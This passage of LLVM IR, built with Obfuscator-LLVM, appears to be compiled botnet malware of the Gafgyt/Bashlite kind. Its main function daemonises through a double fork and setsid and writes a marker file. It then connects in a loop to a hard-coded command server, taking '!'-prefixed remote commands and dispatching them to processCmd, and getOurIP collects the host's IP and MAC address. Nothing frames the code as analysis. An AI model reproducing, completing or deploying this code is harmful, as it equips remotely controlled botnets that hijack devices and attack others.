  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 46, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.76, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #17
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.77, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0)) #14
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readnone) local_unnamed_addr #12 {
  %3 = alloca [50 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca [11 x i8], align 1
  %6 = alloca i32, align 4
  %7 = alloca [4096 x i8], align 16
  %8 = alloca [10 x i8*], align 16
  %9 = getelementptr inbounds [50 x i8], [50 x i8]* %3, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %9, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @main.ismokeweed, i64 0, i64 0), i64 50, i32 16, i1 false)
  %10 = getelementptr inbounds [11 x i8], [11 x i8]* %5, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @main.r00t3d, i64 0, i64 0), i64 11, i32 1, i1 false)
  %11 = call %struct._IO_FILE* @fopen(i8* nonnull %9, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.79, i64 0, i64 0))
  %12 = call i64 @fwrite(i8* nonnull %10, i64 1, i64 11, %struct._IO_FILE* %11)
  %13 = tail call i32 @fileno(%struct._IO_FILE* %11) #3
  %14 = tail call i32 (i32, i32, ...) bitcast (i32 (...)* @fchmod to i32 (i32, i32, ...)*)(i32 %13, i32 3071) #3
  %15 = tail call i32 @fileno(%struct._IO_FILE* %11) #3
  %16 = call i32 (i32, i64, ...) @ioctl(i32 %15, i64 0, i32* nonnull %4) #3
  %17 = call i32 @fclose(%struct._IO_FILE* %11)
  %18 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %19 = call i32 @getpid() #3
  %20 = xor i32 %19, %18
  call void @srand(i32 %20) #3
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %22 = call i32 @getpid() #3
  %23 = xor i32 %22, %21
  call void @init_rand(i32 %23)
  %24 = call i32 @getOurIP()
  %25 = call i32 @fork() #3
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %29, label %27

; <label>:27:                                     ; preds = %2
  %28 = call i32 @waitpid(i32 %25, i32* nonnull %6, i32 0) #3
  call void @exit(i32 0) #16
  unreachable

; <label>:29:                                     ; preds = %2
  %30 = call i32 @fork() #3
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %33, label %32

; <label>:32:                                     ; preds = %29
  call void @exit(i32 0) #16
  unreachable

; <label>:33:                                     ; preds = %29
  %34 = call i32 @setsid() #3
  %35 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #3
  %36 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 1
  %39 = getelementptr inbounds [10 x i8*], [10 x i8*]* %8, i64 0, i64 0
  br label %.backedge83

.backedge83.loopexit:                             ; preds = %.backedge
  br label %.backedge83.backedge

.backedge83:                                      ; preds = %.backedge83.backedge, %33
  %40 = call i32 @initConnection()
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %.preheader81, label %45

.preheader81:                                     ; preds = %.backedge83
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = call i32 @recvLine(i32 %42, i8* nonnull %37, i32 4096)
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %.backedge83.backedge, label %.preheader80.preheader

.backedge83.backedge:                             ; preds = %.preheader81, %45, %.backedge83.loopexit
  br label %.backedge83

.preheader80.preheader:                           ; preds = %.preheader81
  br label %.preheader80

; <label>:45:                                     ; preds = %.backedge83
  %46 = call i32 @sleep(i32 5) #3
  br label %.backedge83.backedge

.preheader80:                                     ; preds = %.preheader80.preheader, %.backedge
  %47 = phi i32 [ %102, %.backedge ], [ %43, %.preheader80.preheader ]
  %48 = load i64, i64* @numpids, align 8
  %49 = icmp eq i64 %48, 0
  br i1 %49, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %.preheader80
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %92
  %indvars.iv = phi i64 [ %indvars.iv.next, %92 ], [ 0, %.lr.ph96.preheader ]
  %50 = load i32*, i32** @pids, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 %indvars.iv
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @waitpid(i32 %52, i32* null, i32 1) #3
  %54 = icmp sgt i32 %53, 0
  br i1 %54, label %.preheader, label %92

.preheader:                                       ; preds = %.lr.ph96
  %55 = add nuw i64 %indvars.iv, 1
  %56 = load i64, i64* @numpids, align 8
  %57 = icmp ult i64 %55, %56
  %58 = load i32*, i32** @pids, align 8
  %59 = trunc i64 %indvars.iv to i32
  br i1 %57, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %60 = trunc i64 %55 to i32
  %61 = trunc i64 %indvars.iv to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %62 = phi i32* [ %71, %.lr.ph ], [ %58, %.lr.ph.preheader ]
  %63 = phi i64 [ %68, %.lr.ph ], [ %55, %.lr.ph.preheader ]
  %.06888 = phi i32 [ %.068, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %.068.in87 = phi i32 [ %.06888, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %64 = getelementptr inbounds i32, i32* %62, i64 %63
  %65 = load i32, i32* %64, align 4
  %66 = zext i32 %.068.in87 to i64
  %67 = getelementptr inbounds i32, i32* %62, i64 %66
  store i32 %65, i32* %67, align 4
  %.068 = add i32 %.06888, 1
  %68 = zext i32 %.068 to i64
  %69 = load i64, i64* @numpids, align 8
  %70 = icmp ult i64 %68, %69
  %71 = load i32*, i32** @pids, align 8
  br i1 %70, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.068.in.lcssa = phi i32 [ %59, %.preheader ], [ %.06888, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %58, %.preheader ], [ %71, %._crit_edge.loopexit ]
  %72 = zext i32 %.068.in.lcssa to i64
  %73 = getelementptr inbounds i32, i32* %.lcssa, i64 %72
  store i32 0, i32* %73, align 4
  %74 = load i64, i64* @numpids, align 8
  %75 = add i64 %74, -1
  store i64 %75, i64* @numpids, align 8
  %76 = shl i64 %74, 2
  %77 = call noalias i8* @malloc(i64 %76) #3
  %78 = bitcast i8* %77 to i32*
  %79 = icmp eq i64 %75, 0
  %80 = load i32*, i32** @pids, align 8
  br i1 %79, label %._crit_edge93, label %.lr.ph92.preheader

.lr.ph92.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph92

.lr.ph92:                                         ; preds = %.lr.ph92.preheader, %.lr.ph92
  %81 = phi i32* [ %90, %.lr.ph92 ], [ %80, %.lr.ph92.preheader ]
  %82 = phi i64 [ %87, %.lr.ph92 ], [ 0, %.lr.ph92.preheader ]
  %.16990 = phi i32 [ %86, %.lr.ph92 ], [ 0, %.lr.ph92.preheader ]
  %83 = getelementptr inbounds i32, i32* %81, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = getelementptr inbounds i32, i32* %78, i64 %82
  store i32 %84, i32* %85, align 4
  %86 = add i32 %.16990, 1
  %87 = zext i32 %86 to i64
  %88 = load i64, i64* @numpids, align 8
  %89 = icmp ult i64 %87, %88
  %90 = load i32*, i32** @pids, align 8
  br i1 %89, label %.lr.ph92, label %._crit_edge93.loopexit

._crit_edge93.loopexit:                           ; preds = %.lr.ph92
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %._crit_edge93.loopexit, %._crit_edge
  %.lcssa84 = phi i32* [ %80, %._crit_edge ], [ %90, %._crit_edge93.loopexit ]
  %91 = bitcast i32* %.lcssa84 to i8*
  call void @free(i8* %91) #3
  store i8* %77, i8** bitcast (i32** @pids to i8**), align 8
  br label %92

; <label>:92:                                     ; preds = %.lr.ph96, %._crit_edge93
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %93 = ashr exact i64 %sext, 32
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %.lr.ph96, label %._crit_edge97.loopexit

._crit_edge97.loopexit:                           ; preds = %92
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %.preheader80
  %96 = sext i32 %47 to i64
  %97 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %96
  store i8 0, i8* %97, align 1
  call void @trim(i8* nonnull %37)
  %strncmp = call i32 @strncmp(i8* nonnull %37, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i64 0, i64 0), i64 13)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %98, label %104

; <label>:98:                                     ; preds = %._crit_edge97
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i32 (i32, i8*, ...) @sockprintf(i32 %99, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph109
  br label %.backedge

.backedge.loopexit126:                            ; preds = %.preheader110
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit126, %.backedge.loopexit, %._crit_edge106.thread, %98, %._crit_edge106, %106
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = call i32 @recvLine(i32 %101, i8* nonnull %37, i32 4096)
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %.backedge83.loopexit, label %.preheader80

; <label>:104:                                    ; preds = %._crit_edge97
  %strncmp72 = call i32 @strncmp(i8* nonnull %37, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i64 0, i64 0), i64 13)
  %cmp73 = icmp eq i32 %strncmp72, 0
  br i1 %cmp73, label %105, label %106

; <label>:105:                                    ; preds = %104
  call void @exit(i32 0) #16
  unreachable

; <label>:106:                                    ; preds = %104
  %107 = load i8, i8* %37, align 16
  %108 = icmp eq i8 %107, 33
  br i1 %108, label %.preheader110.preheader, label %.backedge

.preheader110.preheader:                          ; preds = %106
  br label %.preheader110

.preheader110:                                    ; preds = %.preheader110.preheader, %110
  %.066 = phi i8* [ %111, %110 ], [ %38, %.preheader110.preheader ]
  %109 = load i8, i8* %.066, align 1
  switch i8 %109, label %110 [
    i8 0, label %.backedge.loopexit126
    i8 32, label %112
  ]

; <label>:110:                                    ; preds = %.preheader110
  %111 = getelementptr inbounds i8, i8* %.066, i64 1
  br label %.preheader110

; <label>:112:                                    ; preds = %.preheader110
  store i8 0, i8* %.066, align 1
  %113 = call i64 @strlen(i8* %38) #14
  %114 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %113
  %115 = getelementptr inbounds i8, i8* %114, i64 2
  br label %116

; <label>:116:                                    ; preds = %121, %112
  %117 = call i64 @strlen(i8* %115) #14
  %118 = add i64 %117, -1
  %119 = getelementptr inbounds i8, i8* %115, i64 %118
  %120 = load i8, i8* %119, align 1
  switch i8 %120, label %.preheader78.preheader [
    i8 13, label %121
    i8 10, label %121
  ]

.preheader78.preheader:                           ; preds = %116
  br label %.preheader78

; <label>:121:                                    ; preds = %116, %116
  store i8 0, i8* %119, align 1
  br label %116

.preheader78:                                     ; preds = %.preheader78.preheader, %123
  %.067 = phi i8* [ %124, %123 ], [ %115, %.preheader78.preheader ]
  %122 = load i8, i8* %.067, align 1
  switch i8 %122, label %123 [
    i8 32, label %125
    i8 0, label %125
  ]

; <label>:123:                                    ; preds = %.preheader78
  %124 = getelementptr inbounds i8, i8* %.067, i64 1
  br label %.preheader78

; <label>:125:                                    ; preds = %.preheader78, %.preheader78
  store i8 0, i8* %.067, align 1
  %126 = getelementptr inbounds i8, i8* %.067, i64 1
  %127 = load i8, i8* %115, align 1
  %128 = icmp eq i8 %127, 0
  br i1 %128, label %._crit_edge101, label %.lr.ph100.preheader

.lr.ph100.preheader:                              ; preds = %125
  br label %.lr.ph100

.lr.ph100:                                        ; preds = %.lr.ph100.preheader, %.lr.ph100
  %129 = phi i8 [ %134, %.lr.ph100 ], [ %127, %.lr.ph100.preheader ]
  %.06598 = phi i8* [ %133, %.lr.ph100 ], [ %115, %.lr.ph100.preheader ]
  %130 = zext i8 %129 to i32
  %131 = call i32 @toupper(i32 %130) #14
  %132 = trunc i32 %131 to i8
  store i8 %132, i8* %.06598, align 1
  %133 = getelementptr inbounds i8, i8* %.06598, i64 1
  %134 = load i8, i8* %133, align 1
  %135 = icmp eq i8 %134, 0
  br i1 %135, label %._crit_edge101.loopexit, label %.lr.ph100

._crit_edge101.loopexit:                          ; preds = %.lr.ph100
  br label %._crit_edge101

._crit_edge101:                                   ; preds = %._crit_edge101.loopexit, %125
  %136 = call i8* @strtok(i8* %126, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  store i8* %115, i8** %39, align 16
  %137 = icmp eq i8* %136, null
  br i1 %137, label %._crit_edge106.thread, label %.lr.ph105.preheader

.lr.ph105.preheader:                              ; preds = %._crit_edge101
  br label %.lr.ph105

._crit_edge106.thread:                            ; preds = %._crit_edge101
  call void @processCmd(i32 1, i8** nonnull %39)
  br label %.backedge

.lr.ph105:                                        ; preds = %.lr.ph105.preheader, %150
  %.063103 = phi i8* [ %151, %150 ], [ %136, %.lr.ph105.preheader ]
  %.064102 = phi i32 [ %.1, %150 ], [ 1, %.lr.ph105.preheader ]
  %138 = load i8, i8* %.063103, align 1
  %139 = icmp eq i8 %138, 10
  br i1 %139, label %150, label %140

; <label>:140:                                    ; preds = %.lr.ph105
  %141 = call i64 @strlen(i8* nonnull %.063103) #14
  %142 = add i64 %141, 1
  %143 = call noalias i8* @malloc(i64 %142) #3
  %144 = sext i32 %.064102 to i64
  %145 = getelementptr inbounds [10 x i8*], [10 x i8*]* %8, i64 0, i64 %144
  store i8* %143, i8** %145, align 8
  %146 = call i64 @strlen(i8* nonnull %.063103) #14
  %147 = add i64 %146, 1
  call void @llvm.memset.p0i8.i64(i8* %143, i8 0, i64 %147, i32 1, i1 false)
  %148 = call i8* @strcpy(i8* %143, i8* nonnull %.063103) #3
  %149 = add nsw i32 %.064102, 1
  br label %150

; <label>:150:                                    ; preds = %.lr.ph105, %140
  %.1 = phi i32 [ %149, %140 ], [ %.064102, %.lr.ph105 ]
  %151 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %152 = icmp eq i8* %151, null
  br i1 %152, label %._crit_edge106, label %.lr.ph105

._crit_edge106:                                   ; preds = %150
  call void @processCmd(i32 %.1, i8** nonnull %39)
  %153 = icmp sgt i32 %.1, 1
  br i1 %153, label %.lr.ph109.preheader, label %.backedge

.lr.ph109.preheader:                              ; preds = %._crit_edge106
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph109

.lr.ph109:                                        ; preds = %.lr.ph109.preheader, %.lr.ph109
  %indvars.iv116 = phi i64 [ %indvars.iv.next117, %.lr.ph109 ], [ 1, %.lr.ph109.preheader ]
  %154 = getelementptr inbounds [10 x i8*], [10 x i8*]* %8, i64 0, i64 %indvars.iv116
  %155 = load i8*, i8** %154, align 8
  call void @free(i8* %155) #3
  %indvars.iv.next117 = add nuw nsw i64 %indvars.iv116, 1
  %exitcond = icmp eq i64 %indvars.iv.next117, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph109
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare i64 @fwrite(i8* nocapture, i64, i64, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @fileno(%struct._IO_FILE* nocapture) local_unnamed_addr #5

declare i32 @fchmod(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #14

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind returns_twice }
attributes #16 = { noreturn nounwind }
attributes #17 = { nounwind readnone }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146623954}
!2 = !{i32 -2146622514}
!3 = !{i32 -2146621691}
!4 = distinct !{!4, !5}
!5 = !{!"llvm.loop.unroll.disable"}
!6 = !{i32 -2146620881}
!7 = !{i32 -2146619630}
